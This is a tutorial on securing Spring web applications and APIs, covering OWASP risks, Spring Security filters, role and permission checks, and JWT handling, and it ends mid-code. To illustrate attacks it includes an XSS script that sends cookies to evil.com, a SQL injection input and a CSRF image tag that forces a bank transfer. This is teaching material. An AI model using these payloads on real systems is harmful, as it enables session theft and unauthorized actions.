# 🛡️ Complete Guide to Web Application & API Security with Spring

## Table of Contents
1. [Security Fundamentals](#1-security-fundamentals)
2. [OWASP Top 10 Vulnerabilities](#2-owasp-top-10-vulnerabilities)
3. [Spring Security Architecture](#3-spring-security-architecture)
4. [Authentication Deep Dive](#4-authentication-deep-dive)
5. [Authorization Deep Dive](#5-authorization-deep-dive)
6. [JWT (JSON Web Tokens)](#6-jwt-json-web-tokens)
7. [API Security Best Practices](#7-api-security-best-practices)
8. [Practical Implementation](#8-practical-implementation)
9. [Security Testing](#9-security-testing)
10. [Common Mistakes to Avoid](#10-common-mistakes-to-avoid)

---

## 1. Security Fundamentals

### 1.1 The CIA Triad

Security revolves around three core principles:

```
┌─────────────────────────────────────────┐
│           CONFIDENTIALITY               │
│    (Only authorized users can access)   │
└────────────────────┬────────────────────┘
                     │
        ┌────────────┼────────────┐
        │            │            │
        ▼            ▼            ▼
┌───────────┐  ┌───────────┐  ┌───────────┐
│ INTEGRITY │  │AVAILABILITY│  │           │
│(Data not  │  │(System is  │  │  SECURITY │
│ tampered) │  │accessible) │  │           │
└───────────┘  └───────────┘  └───────────┘
```

- **Confidentiality**: Ensuring data is only accessible to authorized users
- **Integrity**: Ensuring data hasn't been tampered with
- **Availability**: Ensuring systems are accessible when needed

### 1.2 Key Security Concepts

| Concept | Definition | Example |
|---------|------------|---------|
| **Authentication** | Verifying WHO you are | Login with username/password |
| **Authorization** | Verifying WHAT you can do | Can you delete this document? |
| **Encryption** | Converting data to unreadable format | HTTPS, Password hashing |
| **Session** | Server-side storage of user state | Session ID in cookie |
| **Token** | Client-side credential | JWT Bearer token |

### 1.3 Authentication vs Authorization

```
┌─────────────────────────────────────────────────────────────────┐
│                        REQUEST FLOW                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  User Request ──► AUTHENTICATION ──► AUTHORIZATION ──► Resource │
│                      (Who?)            (What?)                   │
│                                                                  │
│  "I am John"      "Is John real?"    "Can John access          │
│                                       this resource?"           │
│                                                                  │
│  Credentials ──► Identity Verified ──► Permissions Checked      │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. OWASP Top 10 Vulnerabilities

The **Open Web Application Security Project (OWASP)** maintains a list of the most critical security risks.

### 2.1 A01: Broken Access Control

**What is it?**
When users can act outside their intended permissions.

**Examples:**
```
❌ Bad: User can access /api/users/123/documents by changing ID to /api/users/456/documents
❌ Bad: Regular user can access /api/admin/users
❌ Bad: User can delete documents they don't own
```

**Spring Protection:**
```java
// Method-level security
@PreAuthorize("hasRole('ADMIN') or #userId == authentication.principal.id")
public Document getDocument(@PathVariable Long userId, @PathVariable Long docId) {
    // ...
}

// Service-level check
public Document getDocument(Long docId, User requestingUser) {
    Document doc = documentRepository.findById(docId)
        .orElseThrow(() -> new ResourceNotFoundException("Document not found"));
    
    if (!doc.getOwner().equals(requestingUser) && !requestingUser.isAdmin()) {
        throw new AccessDeniedException("You cannot access this document");
    }
    return doc;
}
```

### 2.2 A02: Cryptographic Failures

**What is it?**
Weak or missing encryption for sensitive data.

**Examples:**
```
❌ Bad: Storing passwords in plain text
❌ Bad: Using MD5 or SHA1 for password hashing
❌ Bad: Transmitting sensitive data over HTTP (not HTTPS)
❌ Bad: Exposing sensitive data in URLs
```

**Spring Protection:**
```java
// Use BCrypt for password hashing (cost factor of 10-12)
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);
}

// Never store plain text passwords
public User createUser(RegisterRequest request) {
    User user = new User();
    user.setPassword(passwordEncoder.encode(request.getPassword())); // ✅ Hashed
    return userRepository.save(user);
}
```

### 2.3 A03: Injection

**What is it?**
Untrusted data sent to an interpreter as part of a command or query.

**Types:**
- SQL Injection
- NoSQL Injection
- LDAP Injection
- Command Injection

**SQL Injection Example:**
```
❌ Bad: "SELECT * FROM users WHERE username = '" + username + "'"
   Input: ' OR '1'='1
   Result: SELECT * FROM users WHERE username = '' OR '1'='1'
   (Returns ALL users!)
```

**Spring Protection:**
```java
// ✅ Use Spring Data JPA (automatically parameterized)
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByUsername(String username); // Safe!
    
    // If you need custom queries, use parameterized queries
    @Query("SELECT u FROM User u WHERE u.email = :email")
    Optional<User> findByEmail(@Param("email") String email); // Safe!
}

// ❌ NEVER do this
@Query("SELECT u FROM User u WHERE u.email = '" + email + "'") // VULNERABLE!
```

### 2.4 A04: Insecure Design

**What is it?**
Missing or ineffective security controls from the design phase.

**Examples:**
- No rate limiting on authentication endpoints
- No account lockout after failed attempts
- Forgot password sends actual password via email

**Spring Protection:**
```java
// Rate limiting with bucket4j or custom implementation
@Service
public class LoginAttemptService {
    private final Map<String, Integer> attemptsCache = new ConcurrentHashMap<>();
    private static final int MAX_ATTEMPTS = 5;

    public void loginFailed(String username) {
        int attempts = attemptsCache.getOrDefault(username, 0);
        attemptsCache.put(username, attempts + 1);
    }

    public boolean isBlocked(String username) {
        return attemptsCache.getOrDefault(username, 0) >= MAX_ATTEMPTS;
    }
}
```

### 2.5 A05: Security Misconfiguration

**What is it?**
Insecure default configurations, open cloud storage, verbose error messages.

**Examples:**
```
❌ Bad: Debug mode enabled in production
❌ Bad: Default credentials not changed
❌ Bad: Stack traces exposed to users
❌ Bad: Directory listing enabled
```

**Spring Protection:**
```yaml
# application-prod.properties
spring.profiles.active=prod
server.error.include-stacktrace=never
server.error.include-message=never
spring.h2.console.enabled=false
management.endpoints.web.exposure.include=health,info

# Use environment variables for secrets
spring.datasource.password=${DB_PASSWORD}
jwt.secret=${JWT_SECRET}
```

### 2.6 A07: Cross-Site Scripting (XSS)

**What is it?**
Injecting malicious scripts into web pages viewed by other users.

**Types:**
- **Stored XSS**: Script stored in database, executed when page loads
- **Reflected XSS**: Script in URL, reflected back in response
- **DOM-based XSS**: Script manipulates client-side DOM

**Example:**
```javascript
// User submits: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
// If not sanitized, this runs in other users' browsers!
```

**Spring Protection:**
```java
// Thymeleaf auto-escapes by default
<p th:text="${userInput}"></p>  // ✅ Safe - escaped

// For APIs, validate and sanitize input
public class DocumentRequest {
    @NotBlank
    @Size(max = 1000)
    @Pattern(regexp = "^[a-zA-Z0-9\\s.,!?-]*$") // Whitelist allowed characters
    private String content;
}

// Content Security Policy header
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives("default-src 'self'; script-src 'self'")
            )
        );
        return http.build();
    }
}
```

### 2.7 A08: Cross-Site Request Forgery (CSRF)

**What is it?**
Tricking authenticated users into submitting malicious requests.

**How it works:**
```
1. User logs into bank.com (session cookie stored)
2. User visits evil.com
3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. Browser sends request with user's session cookie
5. Bank processes transfer!
```

**Spring Protection:**
```java
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // For traditional web apps - enable CSRF
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );
        
        // For stateless REST APIs with JWT - CSRF less relevant
        // because there's no session cookie to exploit
        // http.csrf(csrf -> csrf.disable());
        
        return http.build();
    }
}
```

---

## 3. Spring Security Architecture

### 3.1 High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          HTTP REQUEST                                    │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                       FILTER CHAIN                                       │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐ │
│  │  Security    │  │ Username     │  │    JWT       │  │   Other      │ │
│  │  Context     │──►  Password    │──►   Filter     │──►  Filters     │ │
│  │  Filter      │  │   Filter     │  │              │  │              │ │
│  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                    AUTHENTICATION MANAGER                                │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │                  AUTHENTICATION PROVIDERS                           │ │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                 │ │
│  │  │    DAO      │  │   LDAP      │  │   OAuth2    │                 │ │
│  │  │  Provider   │  │  Provider   │  │  Provider   │                 │ │
│  │  └─────────────┘  └─────────────┘  └─────────────┘                 │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                      USER DETAILS SERVICE                                │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │        Load user from database and return UserDetails               │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                       SECURITY CONTEXT                                   │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │     Store Authentication object for current thread/request          │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                      AUTHORIZATION                                       │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │  URL-based (antMatchers)  │  Method-based (@PreAuthorize)          │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                        CONTROLLER                                        │
└─────────────────────────────────────────────────────────────────────────┘
```

### 3.2 Key Components

#### SecurityFilterChain
The main entry point - defines which requests need authentication.

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity // For @PreAuthorize
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // Disable CSRF for stateless REST API
            .csrf(csrf -> csrf.disable())
            
            // Session management
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            
            // URL-based authorization
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            
            // Add custom JWT filter
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
}
```

#### UserDetails & UserDetailsService

```java
// Your User entity should implement UserDetails
@Entity
@Table(name = "users")
public class User implements UserDetails {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Column(unique = true, nullable = false)
    private String username;
    
    @Column(nullable = false)
    private String password;
    
    @Enumerated(EnumType.STRING)
    private Role role;
    
    @Override
    public Collection<? extends GrantedAuthority> getAuthorities() {
        List<GrantedAuthority> authorities = new ArrayList<>();
        
        // Add role
        authorities.add(new SimpleGrantedAuthority("ROLE_" + role.name()));
        
        // Add permissions
        authorities.addAll(role.getPermissions().stream()
            .map(permission -> new SimpleGrantedAuthority(permission))
            .toList());
        
        return authorities;
    }
    
    @Override
    public boolean isAccountNonExpired() { return true; }
    
    @Override
    public boolean isAccountNonLocked() { return true; }
    
    @Override
    public boolean isCredentialsNonExpired() { return true; }
    
    @Override
    public boolean isEnabled() { return true; }
}

// Service to load user
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        return userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found: " + username));
    }
}
```

#### Authentication Object

```java
// The Authentication object contains:
public interface Authentication {
    Collection<? extends GrantedAuthority> getAuthorities(); // Roles & permissions
    Object getCredentials();  // Password (usually nulled after auth)
    Object getDetails();      // Additional details
    Object getPrincipal();    // UserDetails object
    boolean isAuthenticated();
}

// Access current user anywhere in your code:
Authentication auth = SecurityContextHolder.getContext().getAuthentication();
User currentUser = (User) auth.getPrincipal();
```

---

## 4. Authentication Deep Dive

### 4.1 Session-Based Authentication

**How it works:**
```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Client  │         │  Server  │         │ Database │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     │  1. POST /login    │                    │
     │  username/password │                    │
     │ ──────────────────►│                    │
     │                    │  2. Validate       │
     │                    │ ──────────────────►│
     │                    │◄─────────────────  │
     │                    │                    │
     │                    │  3. Create Session │
     │                    │  Store in memory   │
     │                    │                    │
     │  4. Set-Cookie:    │                    │
     │  JSESSIONID=abc123 │                    │
     │◄────────────────── │                    │
     │                    │                    │
     │  5. GET /api/data  │                    │
     │  Cookie: abc123    │                    │
     │ ──────────────────►│                    │
     │                    │  6. Lookup session │
     │                    │                    │
     │  7. Response       │                    │
     │◄────────────────── │                    │
```

**Pros:**
- Simple to implement
- Session can be invalidated server-side
- Works well for traditional web apps

**Cons:**
- Server must store session state (memory/database)
- Hard to scale horizontally (need sticky sessions or session replication)
- CSRF vulnerable (cookie automatically sent)

### 4.2 Token-Based Authentication (JWT)

**How it works:**
```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Client  │         │  Server  │         │ Database │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     │  1. POST /login    │                    │
     │  username/password │                    │
     │ ──────────────────►│                    │
     │                    │  2. Validate       │
     │                    │ ──────────────────►│
     │                    │◄─────────────────  │
     │                    │                    │
     │                    │  3. Generate JWT   │
     │                    │  (signed token)    │
     │                    │                    │
     │  4. Response:      │                    │
     │  { "token": "..." }│                    │
     │◄────────────────── │                    │
     │                    │                    │
     │  5. GET /api/data  │                    │
     │  Authorization:    │                    │
     │  Bearer eyJhbGc... │                    │
     │ ──────────────────►│                    │
     │                    │  6. Validate JWT   │
     │                    │  (no DB lookup!)   │
     │                    │                    │
     │  7. Response       │                    │
     │◄────────────────── │                    │
```

**Pros:**
- Stateless - no server-side session storage
- Easily scalable horizontally
- Works great for APIs and SPAs
- Can contain user info (claims)

**Cons:**
- Cannot invalidate token before expiry (unless using blacklist)
- Token size larger than session ID
- Must handle token refresh

### 4.3 OAuth2 / OpenID Connect

**When to use:**
- "Login with Google/GitHub/Facebook"
- Enterprise SSO
- Delegated authorization

```
┌──────────┐      ┌──────────┐      ┌──────────────────┐
│  User    │      │ Your App │      │ Auth Provider    │
│ (Browser)│      │          │      │ (Google, etc.)   │
└────┬─────┘      └────┬─────┘      └────────┬─────────┘
     │                 │                     │
     │ 1. Click "Login │                     │
     │    with Google" │                     │
     │ ───────────────►│                     │
     │                 │                     │
     │ 2. Redirect to  │                     │
     │    Google       │                     │
     │◄─────────────── │                     │
     │                 │                     │
     │ 3. User authenticates with Google     │
     │ ─────────────────────────────────────►│
     │                 │                     │
     │ 4. Redirect back with auth code       │
     │◄───────────────────────────────────── │
     │                 │                     │
     │ 5. Send code    │                     │
     │ ───────────────►│                     │
     │                 │ 6. Exchange code    │
     │                 │    for token        │
     │                 │ ───────────────────►│
     │                 │◄─────────────────── │
     │                 │                     │
     │ 7. Set session/ │                     │
     │    return JWT   │                     │
     │◄─────────────── │                     │
```

---

## 5. Authorization Deep Dive

### 5.1 Role-Based Access Control (RBAC)

Users are assigned roles, roles have permissions.

```java
// Role Enum with Permissions
public enum Role {
    USER(Set.of(
        Permission.DOCUMENT_READ
    )),
    MODERATOR(Set.of(
        Permission.DOCUMENT_READ,
        Permission.DOCUMENT_WRITE
    )),
    ADMIN(Set.of(
        Permission.DOCUMENT_READ,
        Permission.DOCUMENT_WRITE,
        Permission.DOCUMENT_DELETE,
        Permission.USER_READ,
        Permission.USER_WRITE
    ));

    private final Set<Permission> permissions;

    Role(Set<Permission> permissions) {
        this.permissions = permissions;
    }

    public Set<Permission> getPermissions() {
        return permissions;
    }
}

public enum Permission {
    DOCUMENT_READ("document:read"),
    DOCUMENT_WRITE("document:write"),
    DOCUMENT_DELETE("document:delete"),
    USER_READ("user:read"),
    USER_WRITE("user:write");

    private final String permission;

    Permission(String permission) {
        this.permission = permission;
    }

    public String getPermission() {
        return permission;
    }
}
```

### 5.2 URL-Based Authorization

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.authorizeHttpRequests(auth -> auth
        // Public endpoints
        .requestMatchers("/api/auth/**").permitAll()
        .requestMatchers("/api/public/**").permitAll()
        .requestMatchers(HttpMethod.GET, "/api/documents/public").permitAll()
        
        // Role-based
        .requestMatchers("/api/admin/**").hasRole("ADMIN")
        .requestMatchers("/api/moderator/**").hasAnyRole("ADMIN", "MODERATOR")
        
        // Permission-based
        .requestMatchers(HttpMethod.POST, "/api/documents/**").hasAuthority("document:write")
        .requestMatchers(HttpMethod.DELETE, "/api/documents/**").hasAuthority("document:delete")
        
        // Require authentication for everything else
        .anyRequest().authenticated()
    );
    return http.build();
}
```

### 5.3 Method-Level Security

```java
@Configuration
@EnableMethodSecurity(prePostEnabled = true)
public class SecurityConfig { }

// In your controller or service:

@RestController
@RequestMapping("/api/documents")
public class DocumentController {

    // Only users with ADMIN role
    @GetMapping("/admin/all")
    @PreAuthorize("hasRole('ADMIN')")
    public List<Document> getAllDocuments() {
        return documentService.findAll();
    }

    // Users with specific permission
    @PostMapping
    @PreAuthorize("hasAuthority('document:write')")
    public Document createDocument(@RequestBody DocumentRequest request) {
        return documentService.create(request);
    }

    // Owner check using SpEL
    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or @documentService.isOwner(#id, authentication.principal)")
    public void deleteDocument(@PathVariable Long id) {
        documentService.delete(id);
    }

    // Access principal directly
    @GetMapping("/my-documents")
    @PreAuthorize("isAuthenticated()")
    public List<Document> getMyDocuments(@AuthenticationPrincipal User user) {
        return documentService.findByOwner(user);
    }

    // Multiple conditions
    @PutMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or " +
                  "(hasAuthority('document:write') and @documentService.isOwner(#id, authentication.principal))")
    public Document updateDocument(@PathVariable Long id, @RequestBody DocumentRequest request) {
        return documentService.update(id, request);
    }
}
```

### 5.4 Service-Level Authorization

Sometimes you need complex authorization logic:

```java
@Service
public class DocumentService {

    @Autowired
    private DocumentRepository documentRepository;

    public Document getDocument(Long id, User requestingUser) {
        Document document = documentRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("Document not found"));

        // Authorization logic
        if (!canAccess(document, requestingUser)) {
            throw new AccessDeniedException("You don't have access to this document");
        }

        return document;
    }

    private boolean canAccess(Document document, User user) {
        // Public documents - anyone can access
        if (document.getVisibility() == Visibility.PUBLIC) {
            return true;
        }

        // Owner can always access
        if (document.getOwner().getId().equals(user.getId())) {
            return true;
        }

        // Admins can access everything
        if (user.getRole() == Role.ADMIN) {
            return true;
        }

        return false;
    }

    // Method referenced in @PreAuthorize
    public boolean isOwner(Long documentId, User user) {
        return documentRepository.findById(documentId)
            .map(doc -> doc.getOwner().getId().equals(user.getId()))
            .orElse(false);
    }
}
```

---

## 6. JWT (JSON Web Tokens)

### 6.1 JWT Structure

```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

┌─────────────────────────────────────────────────────────────────┐
│                           HEADER                                 │
│  {                                                              │
│    "alg": "HS256",    // Algorithm used for signature           │
│    "typ": "JWT"       // Token type                             │
│  }                                                              │
├─────────────────────────────────────────────────────────────────┤
│                           PAYLOAD                                │
│  {                                                              │
│    "sub": "1234567890",           // Subject (user ID)          │
│    "name": "John Doe",            // Custom claim               │
│    "role": "ADMIN",               // Custom claim               │
│    "iat": 1516239022,             // Issued at                  │
│    "exp": 1516325422              // Expiration time            │
│  }                                                              │
├─────────────────────────────────────────────────────────────────┤
│                          SIGNATURE                               │
│  HMACSHA256(                                                    │
│    base64UrlEncode(header) + "." +                              │
│    base64UrlEncode(payload),                                    │
│    secret                                                        │
│  )                                                              │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2 JWT Implementation

**Dependencies (build.gradle):**
```groovy
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'io.jsonwebtoken:jjwt-api:0.12.5'
    runtimeOnly 'io.jsonwebtoken:jjwt-impl:0.12.5'
    runtimeOnly 'io.jsonwebtoken:jjwt-jackson:0.12.5'
}
```

**JwtTokenProvider:**
```java
@Component
public class JwtTokenProvider {

    @Value("${jwt.secret}")
    private String jwtSecret;

    @Value("${jwt.expiration}")
    private long jwtExpiration; // in milliseconds

    private SecretKey getSigningKey() {
        return Keys.hmacShaKeyFor(jwtSecret.getBytes(StandardCharsets.UTF_8));
    }

    public String generateToken(User user) {
        Date now = new Date();
        Date expiryDate = new Date(now.getTime() + jwtExpiration);

        return Jwts.builder()
            .subject(user.getUsername())
            .claim("userId", user.getId())
            .claim("role", user.getRole().name())
            .issuedAt(now)
            .expiration(expiryDate)
            .signWith(getSigningKey())
            .compact();
    }

    public String getUsernameFromToken(String token) {
        return Jwts.parser()
            .verifyWith(getSigningKey())
            .build()
            .parseSignedClaims(token)
            .getPayload()
            .getSubject();
    }

    public boolean validateToken(String token) {
        try {
            Jwts.parser()
                .verifyWith(getSigningKey())
                .build()
                .parseSignedClaims(token);
            return true;
        } catch (MalformedJwtException ex) {
            log.error("Invalid JWT token");
        } catch (ExpiredJwtException ex) {
            log.error("Expired JWT token");
        } catch (UnsupportedJwtException ex) {
            log.error("Unsupported JWT token");
        } catch (IllegalArgumentException ex) {
            log.error("JWT claims string is empty");
        }
        return false;
    }
}
```

**JwtAuthenticationFilter:**
```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    @Autowired
    private JwtTokenProvider tokenProvider;

    @Autowired
    private CustomUserDetailsService userDetailsService;

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        try {
            String jwt = getJwtFromRequest(request);

            if (StringUtils.hasText(jwt) && tokenProvider.validateToken(jwt)) {
                String username = tokenProvider.getUsernameFromToken(jwt);
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);

                UsernamePasswordAuthenticationToken authentication =
                    new UsernamePasswordAuthenticationToken(
                        userDetails,
                        null,
                        userDetails.getAuthorities()
                    );

                authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                SecurityContextHolder.getContext().setAuthentication(authentication);
            }
        } catch (Exception ex) {
            log.error("Could not set user authentication in security context", ex);
        }

        filterChain.doFilter(request, response);
    }

    private String getJwtFromRequest(HttpServletRequest request) {
        String bearerToken = request.getHeader("Authorization");
        if (StringUtils.hasText(bearerToken) && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7);
        }
        return null;
    }
}
```

### 6.3 Token Refresh Strategy

```
┌──────────────────────────────────────────────────────────────────┐
│                    TOKEN REFRESH FLOW                            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  LOGIN                                                           │
│    │                                                             │
│    ▼                                                             │
│  ┌──────────────┐  ┌───────────────────┐                        │
│  │ Access Token │  │  Refresh Token    │                        │
│  │ (15 min)     │  │  (7 days)         │                        │
│  └──────────────┘  └───────────────────┘                        │
│         │                    │                                   │
│         ▼                    │                                   │
│  Use for API calls           │                                   │
│         │                    │                                   │
│         ▼                    │                                   │
│  Access Token Expired        │                                   │
│         │                    │                                   │
│         └────────────────────┘                                   │
│                    │                                             │
│                    ▼                                             │
│         POST /api/auth/refresh                                   │
│         { "refreshToken": "..." }                                │
│                    │                                             │
│                    ▼                                             │
│         New Access Token + New Refresh Token                     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

```java
@PostMapping("/refresh")
public ResponseEntity<?> refreshToken(@RequestBody RefreshTokenRequest request) {
    String refreshToken = request.getRefreshToken();
    
    // Validate refresh token
    if (!tokenProvider.validateRefreshToken(refreshToken)) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
            .body(new ErrorResponse("Invalid refresh token"));
    }
    
    String username = tokenProvider.getUsernameFromToken(refreshToken);
    User user = userRepository.findByUsername(username)
        .orElseThrow(() -> new UsernameNotFoundException("User not found"));
    
    // Generate new tokens
    String newAccessToken = tokenProvider.generateAccessToken(user);
    String newRefreshToken = tokenProvider.generateRefreshToken(user);
    
    return ResponseEntity.ok(new TokenResponse(newAccessToken, newRefreshToken));
}
```

---

## 7. API Security Best Practices

### 7.1 Input Validation

```java
public class DocumentRequest {
    
    @NotBlank(message = "Title is required")
    @Size(min = 1, max = 200, message = "Title must be between 1 and 200 characters")
    private String title;
    
    @NotBlank(message = "Content is required")
    @Size(max = 50000, message = "Content must not exceed 50000 characters")
    private String content;
    
    @NotNull(message = "Visibility is required")
    private Visibility visibility;
}

@RestController
public class DocumentController {
    
    @PostMapping("/documents")
    public ResponseEntity<?> createDocument(@Valid @RequestBody DocumentRequest request) {
        // Request is already validated
        return ResponseEntity.ok(documentService.create(request));
    }
}

// Global exception handler
@RestControllerAdvice
public class GlobalExceptionHandler {
    
    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity<?> handleValidationErrors(MethodArgumentNotValidException ex) {
        Map<String, String> errors = new HashMap<>();
        ex.getBindingResult().getFieldErrors().forEach(error -> 
            errors.put(error.getField(), error.getDefaultMessage())
        );
        return ResponseEntity.badRequest().body(errors);
    }
}
```

### 7.2 Rate Limiting

```java
// Using Bucket4j
@Component
public class RateLimitingFilter extends OncePerRequestFilter {
    
    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        
        String clientIp = getClientIP(request);
        Bucket bucket = buckets.computeIfAbsent(clientIp, k -> createNewBucket());
        
        if (bucket.tryConsume(1)) {
            filterChain.doFilter(request, response);
        } else {
            response.setStatus(HttpStatus.TOO_MANY_REQUESTS.value());
            response.getWriter().write("Too many requests. Please try again later.");
        }
    }
    
    private Bucket createNewBucket() {
        // 100 requests per minute
        return Bucket.builder()
            .addLimit(Bandwidth.classic(100, Refill.intervally(100, Duration.ofMinutes(1))))
            .build();
    }
}
```

### 7.3 Security Headers

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                // Prevent clickjacking
                .frameOptions(frame -> frame.deny())
                
                // Prevent MIME sniffing
                .contentTypeOptions(Customizer.withDefaults())
                
                // XSS protection
                .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
                
                // HSTS - force HTTPS
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000))
                
                // Content Security Policy
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; script-src 'self'"))
            );
        
        return http.build();
    }
}
```

### 7.4 CORS Configuration

```java
@Configuration
public class CorsConfig {
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        
        // Specific origins (NEVER use * in production)
        configuration.setAllowedOrigins(Arrays.asList(
            "https://myapp.com",
            "https://admin.myapp.com"
        ));
        
        // Or use patterns
        configuration.setAllowedOriginPatterns(Arrays.asList("https://*.myapp.com"));
        
        configuration.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        configuration.setAllowedHeaders(Arrays.asList("Authorization", "Content-Type"));
        configuration.setExposedHeaders(Arrays.asList("X-Total-Count"));
        configuration.setAllowCredentials(true);
        configuration.setMaxAge(3600L);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", configuration);
        return source;
    }
}
```

### 7.5 Logging & Audit Trail

```java
@Aspect
@Component
public class SecurityAuditAspect {
    
    private static final Logger auditLog = LoggerFactory.getLogger("SECURITY_AUDIT");
    
    @Around("@annotation(org.springframework.security.access.prepost.PreAuthorize)")
    public Object auditSecuredMethod(ProceedingJoinPoint joinPoint) throws Throwable {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        String username = auth != null ? auth.getName() : "anonymous";
        String method = joinPoint.getSignature().toShortString();
        
        auditLog.info("User '{}' attempting to access secured method: {}", username, method);
        
        try {
            Object result = joinPoint.proceed();
            auditLog.info("User '{}' successfully accessed: {}", username, method);
            return result;
        } catch (AccessDeniedException e) {
            auditLog.warn("ACCESS DENIED - User '{}' tried to access: {}", username, method);
            throw e;
        }
    }
}
```

### 7.6 Sensitive Data Protection

```java
// Don't expose sensitive data in responses
public class UserResponse {
    private Long id;
    private String username;
    private String email;
    
    // ❌ NEVER include these:
    // private String password;
    // private String ssn;
    // private String creditCardNumber;
}

// Use @JsonIgnore for entity serialization
@Entity
public class User {
    @JsonIgnore // Never serialize password
    private String password;
    
    @JsonIgnore
    private String resetToken;
}

// Or create separate DTOs for internal vs external use
```

---

## 8. Practical Implementation

### 8.1 Complete Security Configuration

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
@RequiredArgsConstructor
public class SecurityConfig {

    private final JwtAuthenticationFilter jwtAuthFilter;
    private final AuthenticationProvider authenticationProvider;
    private final CustomAuthenticationEntryPoint authEntryPoint;
    private final CustomAccessDeniedHandler accessDeniedHandler;

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
